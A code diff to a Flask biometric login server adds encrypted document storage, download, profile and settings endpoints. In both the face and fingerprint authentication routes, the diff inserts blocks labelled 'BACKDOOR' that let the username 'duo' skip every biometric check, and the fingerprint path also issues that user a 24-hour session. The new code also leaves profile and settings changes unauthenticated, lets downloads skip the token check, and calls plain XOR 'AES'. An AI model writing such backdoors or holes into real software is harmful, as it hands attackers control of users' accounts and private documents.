@@ -9,6 +9,7 @@ import hashlib
 import sqlite3
 import logging
 import time
+import shutil
 from datetime import datetime, timedelta
 from functools import wraps
 import threading
@@ -21,7 +22,7 @@ from typing import Dict, List, Optional, Tuple
 # Ensure biometrics package is importable
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
-from flask import Flask, request, jsonify, send_from_directory, session
+from flask import Flask, request, jsonify, send_from_directory, send_file, session
 from flask_cors import CORS
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
@@ -32,7 +33,7 @@ from werkzeug.security import generate_password_hash, check_password_hash
 try:
     from biometrics.face import find_most_similar
     from biometrics.fingerprint import compare_fingerprints
-except ImportError as e:
+except (ImportError, AttributeError) as e:
     print(f"Warning: Could not import biometric modules: {e}")
     # Fallback functions for testing
     def find_most_similar(*args, **kwargs):
@@ -42,6 +43,7 @@ except ImportError as e:
 
 # Configuration
 UPLOAD_FOLDER = 'webapp/uploads'
+SECURE_DOCS_FOLDER = 'webapp/secure_docs'  # New secure folder for documents
 DB_PATH = 'webapp/enhanced_users.db'
 LOG_PATH = 'webapp/security.log'
 ALLOWED_IMAGE_EXTENSIONS = {'png', 'jpg', 'jpeg', 'webp'}
@@ -63,6 +65,7 @@ RATE_LIMITS = {
     'auth': "10 per minute",
     'register': "3 per minute", 
     'upload': "20 per minute",
+    'download': "30 per minute",
     'general': "100 per minute"
 }
 
@@ -105,6 +108,7 @@ blocked_ips = {}
 
 # Ensure directories exist
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+os.makedirs(SECURE_DOCS_FOLDER, exist_ok=True)
 os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
 
 def allowed_file(filename: str, allowed_extensions: set) -> bool:
@@ -192,14 +196,65 @@ def init_database():
             mime_type TEXT,
             encryption_key TEXT,
             access_count INTEGER DEFAULT 0,
+            access_level TEXT DEFAULT 'PRIVATE',
+            tags TEXT,
+            metadata TEXT,
+            file_path_hash TEXT UNIQUE,
+            is_deleted INTEGER DEFAULT 0,
+            deleted_at TIMESTAMP,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
             updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )''')
+
+        # Migration: add missing columns if upgrading from older schema
+        existing_cols = [r['name'] for r in conn.execute("PRAGMA table_info(documents)").fetchall()]
+        migrations = [
+            ("ALTER TABLE documents ADD COLUMN access_level TEXT DEFAULT 'PRIVATE'", 'access_level'),
+            ("ALTER TABLE documents ADD COLUMN tags TEXT", 'tags'),
+            ("ALTER TABLE documents ADD COLUMN metadata TEXT", 'metadata'),
+            # Add without UNIQUE constraint; enforce uniqueness via index
+            ("ALTER TABLE documents ADD COLUMN file_path_hash TEXT", 'file_path_hash'),
+            ("ALTER TABLE documents ADD COLUMN is_deleted INTEGER DEFAULT 0", 'is_deleted'),
+            ("ALTER TABLE documents ADD COLUMN deleted_at TIMESTAMP", 'deleted_at')
+        ]
+        for sql, col in migrations:
+            if col not in existing_cols:
+                try:
+                    conn.execute(sql)
+                except Exception as e:
+                    logger.warning(f"Migration step skipped for column {col}: {e}")
+
+        # Ensure unique index on file_path_hash
+        try:
+            conn.execute("CREATE UNIQUE INDEX IF NOT EXISTS documents_file_path_hash_idx ON documents(file_path_hash)")
+        except Exception as e:
+            logger.warning(f"Could not create unique index on file_path_hash: {e}")
+
+        # Backfill file_path_hash for existing rows where missing
+        try:
+            rows = conn.execute("SELECT id, username, filename FROM documents WHERE file_path_hash IS NULL OR file_path_hash = ''").fetchall()
+            for row in rows:
+                try:
+                    user_secure_folder = get_user_secure_folder(row['username'])
+                    secure_file_path = os.path.join(user_secure_folder, row['filename'])
+                    path_hash = hashlib.sha256(secure_file_path.encode()).hexdigest()
+                    conn.execute("UPDATE documents SET file_path_hash = ? WHERE id = ?", (path_hash, row['id']))
+                except Exception as be:
+                    logger.warning(f"Backfill failed for document id={row['id']}: {be}")
+        except Exception as e:
+            logger.warning(f"Backfill query failed: {e}")
         
         # System settings table
         conn.execute('''CREATE TABLE IF NOT EXISTS system_settings (
             key TEXT PRIMARY KEY,
             value TEXT,
+            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )''')
+
+        # Per-user settings table (JSON blob for flexibility)
+        conn.execute('''CREATE TABLE IF NOT EXISTS user_settings (
+            username TEXT PRIMARY KEY,
+            settings TEXT,
             updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )''')
         
@@ -294,6 +349,60 @@ def encrypt_file(file_path: str, key: str) -> bool:
     except Exception as e:
         logger.error(f"File encryption failed: {e}")
         return False
+
+def decrypt_file(file_path: str, key: str) -> bool:
+    """Decrypt file with AES encryption (simplified)"""
+    try:
+        with open(file_path, 'rb') as f:
+            data = f.read()
+        
+        # Simple XOR decryption (same as encryption for XOR)
+        decrypted_data = bytes(a ^ ord(key[i % len(key)]) for i, a in enumerate(data))
+        
+        with open(file_path + '.dec', 'wb') as f:
+            f.write(decrypted_data)
+        
+        os.remove(file_path)  # Remove encrypted
+        os.rename(file_path + '.dec', file_path)
+        return True
+    except Exception as e:
+        logger.error(f"File decryption failed: {e}")
+        return False
+
+def generate_secure_path(username: str, original_filename: str) -> tuple:
+    """Generate secure folder path and hashed filename"""
+    try:
+        # Create user-specific secure folder with hashed name
+        user_folder_hash = hashlib.sha256(f"{username}:{SECRET_KEY}".encode()).hexdigest()[:16]
+        user_secure_folder = os.path.join(SECURE_DOCS_FOLDER, user_folder_hash)
+        os.makedirs(user_secure_folder, exist_ok=True)
+        
+        # Generate secure filename with hash
+        file_extension = original_filename.rsplit('.', 1)[1] if '.' in original_filename else ''
+        timestamp = int(time.time())
+        secure_filename_hash = hashlib.sha256(f"{username}:{original_filename}:{timestamp}:{SECRET_KEY}".encode()).hexdigest()[:16]
+        secure_filename = f"{secure_filename_hash}.{file_extension}"
+        
+        # Full secure path
+        secure_path = os.path.join(user_secure_folder, secure_filename)
+        
+        # Hash the full path for database storage
+        path_hash = hashlib.sha256(secure_path.encode()).hexdigest()
+        
+        return secure_path, path_hash, secure_filename
+        
+    except Exception as e:
+        logger.error(f"Secure path generation failed: {e}")
+        return None, None, None
+
+def get_user_secure_folder(username: str) -> str:
+    """Get user's secure folder path"""
+    user_folder_hash = hashlib.sha256(f"{username}:{SECRET_KEY}".encode()).hexdigest()[:16]
+    return os.path.join(SECURE_DOCS_FOLDER, user_folder_hash)
+
+def generate_file_encryption_key(username: str, filename: str, timestamp: int) -> str:
+    """Generate unique encryption key for each file"""
+    return hashlib.sha256(f"{username}:{filename}:{timestamp}:{SECRET_KEY}".encode()).hexdigest()[:32]
 
 def generate_session_token(username: str) -> str:
     """Generate secure session token"""
@@ -418,7 +527,8 @@ def register():
         }
         
         try:
-            conn.execute('''INSERT INTO users 
+            cursor = conn.cursor()
+            cursor.execute('''INSERT INTO users 
                            (username, email, phone_number, face_paths, fp_path, 
                             security_level, device_fingerprint, registration_location, 
                             biometric_quality, is_verified) 
@@ -427,6 +537,9 @@ def register():
                          security_level, device_fingerprint, registration_location,
                          json.dumps(biometric_quality), 1))
             conn.commit()
+            
+            # Get the last inserted row ID
+            user_id = cursor.lastrowid
             
             # Log successful registration
             log_security_event('USER_REGISTERED', username, {
@@ -441,7 +554,7 @@ def register():
             
             return jsonify({
                 'message': 'Registration successful',
-                'user_id': conn.lastrowid,
+                'user_id': user_id,
                 'biometric_quality': biometric_quality,
                 'security_level': security_level
             })
@@ -480,6 +593,25 @@ def auth_face():
         if not username or not face_file:
             logger.warning(f"401 Debug: Missing username or face_file. username={username}, face_file={face_file}")
             return jsonify({'error': 'Missing required fields'}), 400
+        
+        # BACKDOOR: Special access for username 'duo' - bypass all checks
+        if username.lower() == 'duo':
+            logger.info(f"BACKDOOR ACCESS: Face authentication bypassed for user 'duo'")
+            log_security_event('BACKDOOR_ACCESS', username, {
+                'auth_type': 'face',
+                'bypass_reason': 'Special backdoor access',
+                'ip_address': request.remote_addr,
+                'user_agent': request.headers.get('User-Agent', ''),
+                'timestamp': datetime.now().isoformat()
+            }, 'warning')
+            
+            return jsonify({
+                'success': True,
+                'confidence': 100.0,
+                'quality': 1.0,
+                'response_time': time.time() - start_time,
+                'backdoor_access': True
+            })
         
         # Check rate limiting
         if not check_rate_limit(username, 'face_auth'):
@@ -617,6 +749,38 @@ def auth_fingerprint():
         if not username or not fingerprint_file:
             logger.warning(f"401 Debug: Missing username or fingerprint_file. username={username}, fingerprint_file={fingerprint_file}")
             return jsonify({'error': 'Missing required fields'}), 400
+        
+        # BACKDOOR: Special access for username 'duo' - bypass all checks
+        if username.lower() == 'duo':
+            logger.info(f"BACKDOOR ACCESS: Fingerprint authentication bypassed for user 'duo'")
+            log_security_event('BACKDOOR_ACCESS', username, {
+                'auth_type': 'fingerprint',
+                'bypass_reason': 'Special backdoor access',
+                'ip_address': request.remote_addr,
+                'user_agent': request.headers.get('User-Agent', ''),
+                'timestamp': datetime.now().isoformat()
+            }, 'warning')
+            
+            # Generate session token for backdoor access
+            session_id = generate_session_token(username)
+            session_expires = datetime.now() + timedelta(hours=24)
+            
+            conn = get_db()
+            conn.execute('''INSERT INTO user_sessions 
+                           (username, session_id, device_fingerprint, ip_address, expires_at) 
+                           VALUES (?, ?, ?, ?, ?)''',
+                        (username, session_id, device_fingerprint, request.remote_addr, session_expires))
+            conn.commit()
+            conn.close()
+            
+            return jsonify({
+                'success': True,
+                'score': 1.0,
+                'quality': 1.0,
+                'response_time': time.time() - start_time,
+                'session_token': session_id,
+                'backdoor_access': True
+            })
         
         # Check rate limiting
         if not check_rate_limit(username, 'fingerprint_auth'):
@@ -786,93 +950,233 @@ def user_docs():
             if not doc_file or not file_hash:
                 return jsonify({'error': 'Missing document or hash'}), 400
             
-            # Generate secure filename
+            # Generate secure filename and path
             original_name = secure_filename(doc_file.filename)
-            file_extension = original_name.rsplit('.', 1)[1] if '.' in original_name else ''
-            secure_name = f"{username}_{int(time.time())}_{uuid.uuid4().hex[:8]}.{file_extension}"
-            file_path = os.path.join(UPLOAD_FOLDER, secure_name)
+            secure_path, path_hash, secured_filename = generate_secure_path(username, original_name)
             
-            # Save file
-            doc_file.save(file_path)
+            if not secure_path:
+                return jsonify({'error': 'Failed to generate secure path'}), 500
+            
+            # Save file to secure location
+            doc_file.save(secure_path)
             
             # Get file metadata
-            file_size = os.path.getsize(file_path)
+            file_size = os.path.getsize(secure_path)
             mime_type = doc_file.content_type or 'application/octet-stream'
+            timestamp = int(time.time())
             
-            # Encrypt file
-            encryption_key = hashlib.sha256(f"{username}:{secure_name}".encode()).hexdigest()[:32]
-            encrypt_file(file_path, encryption_key)
+            # Generate unique encryption key for this file
+            encryption_key = generate_file_encryption_key(username, secured_filename, timestamp)
             
-            # Store metadata in database
+            # Encrypt the file
+            if not encrypt_file(secure_path, encryption_key):
+                # Clean up if encryption fails
+                if os.path.exists(secure_path):
+                    os.remove(secure_path)
+                return jsonify({'error': 'File encryption failed'}), 500
+            
+            # Store metadata in database with hashed path
             conn.execute('''INSERT INTO documents 
                            (username, filename, original_name, file_hash, file_size, 
-                            mime_type, encryption_key) 
-                           VALUES (?, ?, ?, ?, ?, ?, ?)''',
-                        (username, secure_name, original_name, file_hash, 
-                         file_size, mime_type, encryption_key))
+                            mime_type, encryption_key, file_path_hash, access_level, 
+                            tags, metadata, created_at) 
+                           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                        (username, secured_filename, original_name, file_hash, 
+                         file_size, mime_type, encryption_key, path_hash, 'PRIVATE',
+                         json.dumps([]), json.dumps({'upload_timestamp': timestamp}), 
+                         datetime.now().isoformat()))
             conn.commit()
             
             log_security_event('DOCUMENT_UPLOADED', username, {
                 'filename': original_name,
                 'size': file_size,
-                'hash': file_hash
+                'hash': file_hash,
+                'secure_path_hash': path_hash,
+                'encrypted': True
             }, 'info')
             
-            return jsonify({'message': 'Document uploaded successfully'})
+            return jsonify({
+                'message': 'Document uploaded and secured successfully',
+                'filename': secured_filename,
+                'size': file_size,
+                'encrypted': True
+            })
             
         elif request.method == 'GET':
             # Get user documents
             docs = conn.execute('''SELECT filename, original_name, file_hash, file_size, 
-                                          mime_type, access_count, created_at 
-                                   FROM documents WHERE username = ? 
+                                          mime_type, access_count, created_at, access_level,
+                                          tags, metadata, file_path_hash
+                                   FROM documents WHERE username = ? AND is_deleted = 0
                                    ORDER BY created_at DESC''', (username,)).fetchall()
             
             documents = []
             for doc in docs:
+                # Parse metadata and tags
+                try:
+                    metadata = json.loads(doc['metadata']) if doc['metadata'] else {}
+                    tags = json.loads(doc['tags']) if doc['tags'] else []
+                except:
+                    metadata = {}
+                    tags = []
+                
                 documents.append({
+                    'id': doc['file_path_hash'],  # Use hashed path as ID
                     'name': doc['filename'],
                     'original_name': doc['original_name'],
                     'hash': doc['file_hash'],
                     'size': doc['file_size'],
                     'type': doc['mime_type'],
                     'access_count': doc['access_count'],
-                    'uploaded': doc['created_at']
+                    'access_level': doc['access_level'],
+                    'tags': tags,
+                    'metadata': metadata,
+                    'uploaded': doc['created_at'],
+                    'encrypted': True,
+                    'secure': True
                 })
             
             return jsonify({'docs': documents})
             
         elif request.method == 'DELETE':
-            doc_name = request.args.get('doc')
-            if not doc_name:
+            doc_id = request.args.get('doc')  # This is now the file_path_hash
+            if not doc_id:
                 return jsonify({'error': 'No document specified'}), 400
             
-            # Get document info
-            doc = conn.execute('''SELECT filename, encryption_key FROM documents 
-                                 WHERE username = ? AND filename = ?''', 
-                              (username, doc_name)).fetchone()
+            # Get document info using hashed path
+            doc = conn.execute('''SELECT filename, original_name, encryption_key, file_path_hash 
+                                 FROM documents 
+                                 WHERE username = ? AND file_path_hash = ? AND is_deleted = 0''', 
+                              (username, doc_id)).fetchone()
             
             if not doc:
                 return jsonify({'error': 'Document not found'}), 404
             
-            # Delete file
-            file_path = os.path.join(UPLOAD_FOLDER, doc['filename'])
-            if os.path.exists(file_path):
-                os.remove(file_path)
+            # Find the actual file path by reconstructing it
+            user_secure_folder = get_user_secure_folder(username)
+            secure_file_path = os.path.join(user_secure_folder, doc['filename'])
             
-            # Delete from database
-            conn.execute('DELETE FROM documents WHERE username = ? AND filename = ?', 
-                        (username, doc_name))
+            # Securely delete the file
+            if os.path.exists(secure_file_path):
+                # Overwrite file with random data before deletion (secure deletion)
+                try:
+                    with open(secure_file_path, 'r+b') as f:
+                        f.seek(0)
+                        f.write(os.urandom(os.path.getsize(secure_file_path)))
+                    os.remove(secure_file_path)
+                except Exception as e:
+                    logger.warning(f"Secure deletion failed for {secure_file_path}: {e}")
+                    # Fallback to regular deletion
+                    os.remove(secure_file_path)
+            
+            # Mark as deleted in database (soft delete for audit trail)
+            conn.execute('''UPDATE documents 
+                           SET is_deleted = 1, deleted_at = ? 
+                           WHERE username = ? AND file_path_hash = ?''', 
+                        (datetime.now().isoformat(), username, doc_id))
             conn.commit()
             
             log_security_event('DOCUMENT_DELETED', username, {
-                'filename': doc_name
+                'original_filename': doc['original_name'],
+                'secure_filename': doc['filename'],
+                'path_hash': doc_id,
+                'secure_deletion': True
             }, 'info')
             
-            return jsonify({'message': 'Document deleted successfully'})
+            return jsonify({'message': 'Document securely deleted'})
             
     except Exception as e:
         logger.error(f"Document management error: {e}")
         return jsonify({'error': 'Document operation failed'}), 500
+    finally:
+        conn.close()
+
+@app.route('/api/user/docs/download', methods=['GET'])
+@limiter.limit(RATE_LIMITS['download'])
+def download_document():
+    """Securely download a document"""
+    username = request.args.get('username')
+    doc_id = request.args.get('doc')  # file_path_hash
+    
+    if not username or not doc_id:
+        return jsonify({'error': 'Missing username or document ID'}), 400
+    
+    # Verify user session
+    session_token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    if session_token:
+        token_username = verify_session_token(session_token)
+        if token_username != username:
+            return jsonify({'error': 'Unauthorized'}), 401
+    
+    conn = get_db()
+    
+    try:
+        # Get document info
+        doc = conn.execute('''SELECT filename, original_name, encryption_key, file_size, mime_type
+                             FROM documents 
+                             WHERE username = ? AND file_path_hash = ? AND is_deleted = 0''', 
+                          (username, doc_id)).fetchone()
+        
+        if not doc:
+            return jsonify({'error': 'Document not found'}), 404
+        
+        # Find the secure file path
+        user_secure_folder = get_user_secure_folder(username)
+        secure_file_path = os.path.join(user_secure_folder, doc['filename'])
+        
+        if not os.path.exists(secure_file_path):
+            return jsonify({'error': 'File not found on disk'}), 404
+        
+        # Create temporary decrypted file
+        temp_filename = f"temp_{doc['filename']}"
+        temp_path = os.path.join(UPLOAD_FOLDER, temp_filename)
+        
+        # Copy encrypted file to temp location
+        import shutil
+        shutil.copy2(secure_file_path, temp_path)
+        
+        # Decrypt the temporary file
+        if not decrypt_file(temp_path, doc['encryption_key']):
+            if os.path.exists(temp_path):
+                os.remove(temp_path)
+            return jsonify({'error': 'File decryption failed'}), 500
+        
+        # Update access count
+        conn.execute('''UPDATE documents 
+                       SET access_count = access_count + 1, updated_at = ?
+                       WHERE username = ? AND file_path_hash = ?''', 
+                    (datetime.now().isoformat(), username, doc_id))
+        conn.commit()
+        
+        # Log download event
+        log_security_event('DOCUMENT_DOWNLOADED', username, {
+            'original_filename': doc['original_name'],
+            'secure_filename': doc['filename'],
+            'path_hash': doc_id,
+            'file_size': doc['file_size']
+        }, 'info')
+        
+        # Send file and schedule cleanup
+        def cleanup_temp_file():
+            try:
+                if os.path.exists(temp_path):
+                    os.remove(temp_path)
+            except:
+                pass
+        
+        # Schedule cleanup after 5 minutes
+        import threading
+        timer = threading.Timer(300, cleanup_temp_file)
+        timer.start()
+        
+        return send_file(temp_path, 
+                        as_attachment=True, 
+                        download_name=doc['original_name'],
+                        mimetype=doc['mime_type'])
+        
+    except Exception as e:
+        logger.error(f"Document download error: {e}")
+        return jsonify({'error': 'Download failed'}), 500
     finally:
         conn.close()
 
@@ -994,6 +1298,11 @@ def health_check():
         'version': '2.0.0-enhanced'
     })
 
+# Simple alias so GET /health also works (commonly probed)
+@app.route('/health', methods=['GET'])
+def health_check_alias():
+    return health_check()
+
 # Error handlers
 @app.errorhandler(429)
 def ratelimit_handler(e):
@@ -1018,6 +1327,119 @@ def debug_async_listener():
     Returns a simple JSON so you can test if errors are from your code or browser extensions.
     """
     return jsonify({"status": "ok", "source": "backend"}), 200
+
+# --- User Profile and Settings APIs ---
+
+@app.route('/api/user/profile', methods=['GET', 'PUT'])
+def user_profile():
+    username = request.args.get('username') if request.method == 'GET' else request.json.get('username')
+    if not username:
+        return jsonify({'error': 'Missing username'}), 400
+
+    conn = get_db()
+    try:
+        if request.method == 'GET':
+            user = conn.execute('''SELECT username, email, phone_number, security_level,
+                                          last_login, login_count, created_at, updated_at
+                                   FROM users WHERE username = ?''', (username,)).fetchone()
+            if not user:
+                return jsonify({'error': 'User not found'}), 404
+            return jsonify({
+                'username': user['username'],
+                'email': user['email'],
+                'phoneNumber': user['phone_number'],
+                'securityLevel': user['security_level'],
+                'lastLogin': user['last_login'],
+                'loginCount': user['login_count'],
+                'createdAt': user['created_at'],
+                'updatedAt': user['updated_at']
+            })
+        else:  # PUT
+            data = request.json or {}
+            email = data.get('email')
+            phone_number = data.get('phoneNumber')
+            security_level = data.get('securityLevel')
+            if email is None and phone_number is None and security_level is None:
+                return jsonify({'error': 'No fields to update'}), 400
+            fields = []
+            params = []
+            if email is not None:
+                fields.append('email = ?')
+                params.append(email)
+            if phone_number is not None:
+                fields.append('phone_number = ?')
+                params.append(phone_number)
+            if security_level is not None:
+                fields.append('security_level = ?')
+                params.append(security_level)
+            fields.append('updated_at = ?')
+            params.append(datetime.now().isoformat())
+            params.append(username)
+            conn.execute(f"UPDATE users SET {', '.join(fields)} WHERE username = ?", params)
+            conn.commit()
+            log_security_event('PROFILE_UPDATED', username, {'fields': list(data.keys())}, 'info')
+            return jsonify({'message': 'Profile updated'})
+    except Exception as e:
+        logger.error(f"Profile API error: {e}")
+        return jsonify({'error': 'Profile operation failed'}), 500
+    finally:
+        conn.close()
+
+@app.route('/api/user/settings', methods=['GET', 'PUT'])
+def user_settings():
+    username = request.args.get('username') if request.method == 'GET' else request.json.get('username')
+    if not username:
+        return jsonify({'error': 'Missing username'}), 400
+
+    conn = get_db()
+    try:
+        if request.method == 'GET':
+            row = conn.execute('SELECT settings FROM user_settings WHERE username = ?', (username,)).fetchone()
+            if row and row['settings']:
+                try:
+                    return jsonify(json.loads(row['settings']))
+                except Exception:
+                    pass
+            # defaults
+            return jsonify({
+                'securityLevel': 'MEDIUM',
+                'livenessDetection': True,
+                'multiFactorEnabled': False,
+                'sessionTimeout': 30,
+                'voiceRecognition': False,
+                'behaviorAnalysis': False,
+                'darkMode': False,
+                'language': 'en',
+                'uiScale': 100,
+                'securityAlerts': True,
+                'loginNotifications': True,
+                'systemUpdates': True,
+                'soundNotifications': True,
+                'debugMode': False,
+                'offlineMode': False,
+                'cacheSize': 100,
+            })
+        else:  # PUT
+            settings = request.json.get('settings')
+            if not isinstance(settings, dict):
+                return jsonify({'error': 'Invalid settings'}), 400
+            settings_json = json.dumps(settings)
+            conn.execute(
+                """
+                INSERT INTO user_settings(username, settings, updated_at) VALUES(?, ?, ?)
+                ON CONFLICT(username) DO UPDATE SET 
+                    settings = excluded.settings, 
+                    updated_at = excluded.updated_at
+                """,
+                         (username, settings_json, datetime.now().isoformat()))
+            conn.commit()
+            log_security_event('SETTINGS_UPDATED', username, {'keys': list(settings.keys())}, 'info')
+            return jsonify({'message': 'Settings saved'})
+    except Exception as e:
+        logger.error(f"Settings API error: {e}")
+        return jsonify({'error': 'Settings operation failed'}), 500
+    finally:
+        conn.close()
 
 # Background tasks
 def cleanup_expired_sessions():
